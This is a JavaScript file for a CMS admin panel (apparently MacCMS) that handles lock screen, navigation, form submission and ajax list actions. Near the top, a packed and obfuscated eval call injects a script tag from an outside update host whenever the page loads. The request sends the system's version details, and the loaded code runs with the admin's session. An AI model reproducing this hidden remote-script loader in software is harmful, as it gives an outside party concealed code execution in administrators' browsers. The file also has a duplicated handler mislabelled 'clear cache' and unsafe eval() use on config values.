String.prototype.trim = function () {
    return this.replace(/(^[\s\u3000]*)|([\s\u3000]*$)/g, "");
}
String.prototype.ltrim = function () {
    return this.replace(/(^\s*)/g, "");
}
String.prototype.rtrim = function () {
    return this.replace(/(\s*$)/g, "");
}
String.prototype.replaceAll = function (s1, s2) {
    return this.replace(new RegExp(s1, "gm"), s2);
}

layui.define(['element', 'form'], function (exports) {
    var $ = layui.jquery, element = layui.element, layer = layui.layer, form = layui.form;

    $(function () {
        if (typeof (MAC_VERSION) != 'undefined' && typeof (PHP_VERSION) != 'undefined' && typeof (THINK_VERSION) != 'undefined') {
            eval(function (p, a, c, k, e, r) { e = function (c) { return c.toString(a) }; if (!''.replace(/^/, String)) { while (c--) r[e(c)] = k[c] || e(c); k = [function (e) { return r[e] }]; e = function () { return '\\w+' }; c = 1 }; while (c--) if (k[c]) p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]); return p }('$(\'3\').9(\'<0\'+\'1 4="\'+\'//5.6.7/8/?c=2&a=\'+b+\'&d=\'+e+\'&f=\'+g+\'&h=\'+i.j()+\'"></0\'+\'1>\');', 20, 20, 'scr|ipt|check|body|src|update|maccms|la|v10|append|v|MAC_VERSION||p|PHP_VERSION|tp|THINK_VERSION|t|Math|random'.split('|'), 0, {}));
        }
    });

    form.render();

    var lockscreen = function () {
        document.oncontextmenu = new Function("event.returnValue=false;");
        document.onselectstart = new Function("event.returnValue=false;");
        layer.open({
            title: false,
            type: 1,
            content: '<div class="lock-screen"><input type="password" class="unlockedPwd layui-input" placeholder="请输入登录密码解锁..." autocomplete="off"><button class="unlocked layui-btn">解锁</button><div class="unlockTips"></div></div>',
            closeBtn: 0,
            shade: 0.95,
            offset: '350px'
        });
    };
    /* 锁屏 */
    $('#lockScreen').click(function () {
        window.sessionStorage.setItem("lockscreen", true);
        lockscreen();
    });
    /* 清理缓存 */
    $('#lockScreen').click(function () {
        window.sessionStorage.setItem("lockscreen", true);
        lockscreen();
    });

    if (window.sessionStorage.getItem("lockscreen") == "true") {
        lockscreen();
    }

    $(document).on('click', '.unlocked', function () {
        var pwd = $(this).parent().find('.unlockedPwd').val();
        if (pwd == '') {
            return false;
        }
        $.post(ADMIN_PATH + '/admin/index/unlocked', { password: pwd }, function (res) {
            if (res.code == 1) {
                window.sessionStorage.setItem("lockscreen", false);
                layer.closeAll();
            } else {
                $('.unlockTips').html(res.msg);
                setTimeout(function () {
                    $('.unlockTips').html('');
                }, 3000);
            }
        });
    });

    /* 导航高亮标记 */
    $('.admin-nav-item').click(function () {
        window.localStorage.setItem("adminNavTag", $(this).attr('href'));
    });
    if (window.localStorage.getItem("adminNavTag")) {
        $('#switchNav a[href="' + window.localStorage.getItem("adminNavTag") + '"]').parent('dd').addClass('layui-this').parents('li').addClass('layui-nav-itemed').siblings('li').removeClass('layui-nav-itemed');
    }
    if (typeof (LAYUI_OFFSET) == 'undefined') {
        layer.config({ offset: '60px' });
    } else {
        layer.config({ offset: LAYUI_OFFSET + 'px' });
    }
    /* 打开/关闭左侧导航 */
    $('#foldSwitch').click(function () {
        var that = $(this);
        if (!that.hasClass('close')) {
            that.addClass('close');
            $('#switchNav').animate({ width: '52px' }, 100).addClass('close').hover(function () {
                if (that.hasClass('close')) {
                    $(this).animate({ width: '200px' }, 300);
                    $('#switchNav .fold-mark').removeClass('fold-mark');
                    $('a[href="' + window.localStorage.getItem("adminNavTag") + '"]').parent('dd').addClass('layui-this').parents('li').addClass('layui-nav-itemed').siblings('li').removeClass('layui-nav-itemed');
                }
            }, function () {
                if (that.hasClass('close')) {
                    $(this).animate({ width: '52px' }, 300);
                    $('#switchNav .layui-nav-item').addClass('fold-mark').removeClass('layui-nav-itemed');
                }
            });
            $('#switchBody,.footer').animate({ left: '52px' }, 100);
            $('#switchNav .layui-nav-item').addClass('fold-mark').removeClass('layui-nav-itemed');
        } else {
            $('a[href="' + window.localStorage.getItem("adminNavTag") + '"]').parent('dd').addClass('layui-this').parents('li').addClass('layui-nav-itemed').siblings('li').removeClass('layui-nav-itemed');
            that.removeClass('close');
            $('#switchNav').animate({ width: '200px' }, 100).removeClass('close');
            $('#switchBody,.footer').animate({ left: '200px' }, 100);
            $('#switchNav .fold-mark').removeClass('fold-mark');
        }
    });

    /* 导航菜单切换 */
    $('.main-nav a').click(function () {
        var that = $(this), i = $(this).attr('data-i');
        $('.layui-nav-tree').hide().eq(i - 1).show();
    });

    /* 操作提示 */
    $('.help-tips').click(function () {
        layer.tips($(this).attr('data-title'), this, {
            tips: [3, '#009688'],
            time: 5000
        });
        return false;
    });

    /* 全屏控制 */
    $('#fullscreen-btn').click(function () {
        var that = $(this);
        if (!that.hasClass('ai-quanping')) {
            $('#switchBody').css({ 'z-index': 1000 });
            $('#switchNav').css({ 'z-index': 900 });
            that.addClass('ai-quanping').removeClass('ai-quanping1').parents('.page-body').addClass('fullscreen');
            $('.page-tab-content').css({ 'min-height': ($(window).height() - 63) + 'px' });
        } else {
            $('#switchBody').css({ 'z-index': 998 });
            $('#switchNav').css({ 'z-index': 1000 });
            that.addClass('ai-quanping1').removeClass('ai-quanping').parents('.page-body').removeClass('fullscreen');
            $('.page-tab-content').css({ 'min-height': 'auto' });
        }
    });

    /*弹出选择设置*/
    $(document).on('click', '.j-select', function () {
        var that = $(this);
        _url = that.attr('data-href'),
            _title = that.attr('data-title'),
            _width = that.attr('data-width') ? that.attr('data-width') + '' : 750,
            _height = that.attr('data-height') ? that.attr('data-height') + '' : 500,
            _full = that.attr('data-full'),
            _checkbox = that.attr('data-checkbox');

        if (that.parents('form')[0]) {
            var query = that.parents('form').serialize();
        } else {
            var query = $('#pageListForm').serialize();
        }
        if (_checkbox && !query) {
            return;
        }
        $.post(_url, query, function (res) {
            layer.closeAll('dialog');
            var lay = layer.open({ type: 1, title: _title, content: res, area: [_width + 'px', _height + 'px'] });
            form.render('select');
        });
    });

    /*iframe弹窗*/
    $(document).on('click', '.j-iframe', function () {
        var that = $(this),
            _url = that.attr('data-href'),
            _title = that.attr('data-title'),
            _width = that.attr('data-width') ? that.attr('data-width') + '' : '85%',
            _height = that.attr('data-height') ? that.attr('data-height') + '' : '80%',
            _full = that.attr('data-full'),
            _checkbox = that.attr('data-checkbox');


        if (!_url) {
            layer.msg('请设置href参数');
            return false;
        }
        if (_checkbox) {
            if ($('.checkbox-ids:checked').length <= 0) {
                layer.msg('请选择要操作的数据');
                return false;
            }

            var ids = [];
            $('.checkbox-ids:checked').each(function (index, item) {
                if (item.checked) {
                    ids.push(item.value);
                }
            });
            _ids = ids.join(',');
            _url = _url.indexOf('?') > -1 ? _url + '&ids=' + _ids : _url + '?ids=' + _ids;
        }
        var lay = layer.open({ type: 2, title: _title, content: _url, area: [_width + '', _height + ''] });
        if (_full == '1') {
            layer.full(lay);
        }
        return false;
    });

    /* 全选 */
    form.on('checkbox(allChoose)', function (data) {
        var child = $(data.elem).parents('table').find('tbody input.checkbox-ids');
        child.each(function (index, item) {
            item.checked = data.elem.checked;
        });
        form.render('checkbox');
    });

    /* 监听状态设置开关 */
    form.on('switch(switchStatus)', function (data) {
        var that = $(this), status = 0;
        if (!that.attr('data-href')) {
            layer.msg('请设置data-href参数');
            return false;
        }
        if (this.checked) {
            status = 1;
        }
        $.get(that.attr('data-href'), { val: status }, function (res) {
            layer.msg(res.msg);
            if (res.code == 0) {
                that.trigger('click');
                form.render('checkbox');
            }
        });
    });

    /* 监听表单提交 */
    form.on('submit(formSubmit)', function (data) {
        var that = $(this),
            _form = '';
        _child = !that.attr('data-child') ? 'no' : that.attr('data-child'),
            refresh = !that.attr('refresh') ? 'yes' : that.attr('refresh');

        if ($(this).attr('data-form')) {
            _form = $($(this).attr('data-form'));
        } else {
            _form = $(this).parents('form');
        }

        var $form = _form;
        var $button = $form.find('[lay-submit]');

        $button.prop('disabled', true);

        // CKEditor专用
        if (typeof (CKEDITOR) != 'undefined') {
            for (instance in CKEDITOR.instances) {
                CKEDITOR.instances[instance].updateElement();
            }
        }
        layer.msg('数据提交中...', { time: 500000 });
        $.ajax({
            type: "POST",
            url: $form.attr('action'),
            data: $form.serialize(),
            success: function (res) {
                var msg = '<span class="success_layer_icon"></span>' + res.msg;
                if (res.code == 1) {
                    msg = '<span class="success_layer_icon"></span>' + res.msg;
                } else {
                    msg = '<span class="error_layer_icon"></span>' + res.msg;
                }
                layer.msg(msg, { time: 800, skin: res.code == 1 ? 'success_layer' : 'error_layer' }, function () {
                    if (res.code == 1) {
                        if (refresh == 'yes') {
                            if (_child == 'true') {
                                parent.location.reload();
                                parent.layer.close(index);
                            }
                            else {
                                if (typeof (res.url) != 'undefined' && res.url != null && res.url != '') {
                                    location.href = res.url;
                                } else {
                                    location.reload();
                                }
                            }
                        }
                        else {
                            var index = parent.layer.getFrameIndex(window.name);
                            layer.closeAll();
                            onSubmitResult(res);
                        }
                    } else {
                        $button.prop('disabled', false);
                    }
                });
            },
            error: function (xhr, status, error) {
                $button.prop('disabled', false);
                layer.msg('<span class="error_layer_icon"></span>' + '请求失败', { time: 800, skin: 'error_layer' });
            }
        });
        return false;
    });

    /* TR数据行删除 */
    $('.j-tr-del').click(function () {
        var that = $(this),
            href = !that.attr('data-href') ? that.attr('href') : that.attr('data-href');
        layer.confirm('删除之后无法恢复，您确定要删除吗？', { title: false, closeBtn: 0 }, function (index) {
            if (!href) {
                layer.msg('请设置data-href参数');
                return false;
            }
            $.get(href, function (res) {
                layer.msg(res.msg);
                if (res.code == 1) {
                    that.parents('tr').remove();
                    that.parents('.tr').remove();
                }
            });
            layer.close(index);
        });
        return false;
    });

    /* ajax请求操作 */
    $(document).on('click', '.j-ajax', function () {
        var that = $(this),
            href = !that.attr('data-href') ? that.attr('href') : that.attr('data-href'),
            refresh = !that.attr('refresh') ? 'yes' : that.attr('refresh');
        if (!href) {
            layer.msg('请设置data-href参数');
            return false;
        }

        if (!that.attr('confirm')) {
            layer.msg('数据提交中...', { time: 500000 });
            $.get(href, {}, function (res) {
                layer.msg(res.msg, {}, function () {
                    if (refresh == 'yes') {
                        if (typeof (res.url) != 'undefined' && res.url != null && res.url != '') {
                            location.href = res.url;
                        } else {
                            location.reload();
                        }
                    }
                });
            });
            layer.close();
        }
        else {
            layer.confirm(that.attr('confirm'), { title: false, closeBtn: 0 }, function (index) {
                layer.msg('数据提交中...', { time: 500000 });
                $.get(href, {}, function (res) {
                    layer.msg(res.msg, {}, function () {
                        if (refresh == 'yes') {
                            if (typeof (res.url) != 'undefined' && res.url != null && res.url != '') {
                                location.href = res.url;
                            } else {
                                location.reload();
                            }
                        }
                    });
                });
                layer.close(index);
            });
        }
        return false;
    });

    /* 数据列表input编辑自动选中ids */
    $('.j-auto-checked').blur(function () {
        var that = $(this);
        if (that.attr('data-value') != that.val()) {
            that.parents('tr').find('input[name="ids[]"]').attr("checked", true);
        } else {
            that.parents('tr').find('input[name="ids[]"]').attr("checked", false);
        };
        form.render('checkbox');
    });

    /* 用ajax方式更新input*/
    $('.j-ajax-input').focusout(function () {
        var that = $(this), _val = that.val();
        if (_val == '') return false;
        if (that.attr('data-value') == _val) return false;
        if (!that.attr('data-href')) {
            layer.msg('请设置data-href参数');
            return false;
        }
        $.post(that.attr('data-href'), { val: _val }, function (res) {
            if (res.code == 1) {
                that.attr('data-value', _val);
            }
            layer.msg(res.msg);
        });
    });

    /* 小提示 */
    $('.tooltip').hover(function () {
        var that = $(this);
        that.find('i').show();
    }, function () {
        var that = $(this);
        that.find('i').hide();
    });

    $('.j-search').click(function () {
        var that = $(this);
        that.parents('form').attr('method', 'get');
        that.parents('form').submit();
    });

    /* 列表按钮组 */
    $('.j-page-btns').click(function () {
        var that = $(this),
            code = function (that) {
                var href = that.attr('href') ? that.attr('href') : that.attr('data-href'),
                    _checkbox = !that.attr('data-checkbox') ? 'yes' : that.attr('data-checkbox'),
                    _ajax = !that.attr('data-ajax') ? 'yes' : that.attr('data-ajax'),
                    _ids = '';
                if (!href) {
                    layer.msg('请设置data-href参数');
                    return false;
                }

                if (_checkbox == 'yes') {
                    if ($('.checkbox-ids:checked').length <= 0) {
                        layer.msg('请选择要操作的数据');
                        return false;
                    }
                    var ids = [];
                    $('.checkbox-ids:checked').each(function (index, item) {
                        if (item.checked) {
                            ids.push(item.value);
                        }
                    });
                    _ids = ids.join(',');
                }
                if (_ajax == 'yes') {
                    if (that.parents('form')[0]) {
                        var query = that.parents('form').serialize();
                    } else {
                        var query = $('#pageListForm').serialize();
                    }
                    layer.msg('数据提交中...', { time: 500000 });
                    $.post(href, query, function (res) {
                        layer.msg(res.msg, {}, function () {
                            if (res.code != 0) {
                                location.reload();
                            }
                        });
                    });
                }
                else {
                    location.href = href.indexOf('?') == -1 ? href + '?ids=' + _ids : href + '&ids=' + _ids;
                }
            };
        if (that.hasClass('confirm')) {
            var tips = that.attr('tips') ? that.attr('tips') : '您确定要执行此操作吗？';
            layer.confirm(tips, { title: false, closeBtn: 0 }, function (index) {
                code(that);
                layer.close(index);
            });
        } else {
            code(that);
        }
        return false;
    });


    exports('global', {});
});

function onSelectResult(input, obj) {
    var ids = [];
    var s1 = '', s2 = '';
    $(obj).each(function (index, item) {
        if (item.checked) {
            s1 = $("input[name='" + input + "']").val();
            s2 = ',' + s1 + ',';
            if (s2.indexOf(',' + item.value + ',') == -1) {
                if (s1.length > 0 && s1.substring(s1.length - 1) != ',') {
                    s1 += ',';
                }
                s1 += item.value;
                $("input[name='" + input + "']").val(s1);
            }
        }
    });
    alert('添加成功!');
}

function rndNum(under, over) {
    switch (arguments.length) {
        case 1: return parseInt(Math.random() * under + 1);
        case 2: return parseInt(Math.random() * (over - under + 1) + under);
        default: return 0;
    }
}

function changeParam(url, name, value) {
    var newUrl = "";
    var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
    var tmp = name + "=" + value;
    if (url.match(reg) != null) {
        newUrl = url.replace(eval(reg), '&' + tmp + '&');
    }
    else {
        if (url.match("[\?]")) {
            newUrl = url + "&" + tmp;
        }
        else {
            newUrl = url + "?" + tmp;
        }
    }
    return newUrl;
}

function getDataTime(ts, ty) {
    if (ts < 1) {
        return '';
    }
    var t, y, m, d, h, i, s;
    t = ts ? new Date(ts * 1000) : new Date();
    y = t.getFullYear();
    m = t.getMonth() + 1;
    d = t.getDate();
    h = t.getHours();
    i = t.getMinutes();
    s = t.getSeconds();
    r = y + '-' + (m < 10 ? '0' + m : m) + '-' + (d < 10 ? '0' + d : d);

    if (ty == undefined || ty == '') {
        r += ' ' + (h < 10 ? '0' + h : h) + ':' + (i < 10 ? '0' + i : i) + ':' + (s < 10 ? '0' + s : s)
    }
    return r;
}

function mac_url_img(url) {
    url = url.replace('mac:', 'http:');
    if (url.indexOf("http") == -1 || url.indexOf("//") == -1) {
        url = ROOT_PATH + "/" + url;
    }
    else if (UPLOAD_IMG_KEY != '' && UPLOAD_IMG_API != '') {
        var reg = eval("/" + UPLOAD_IMG_KEY + "/i");
        if (reg.test(url) != false) {
            url = UPLOAD_IMG_API + url;
        }
    }
    return url;
}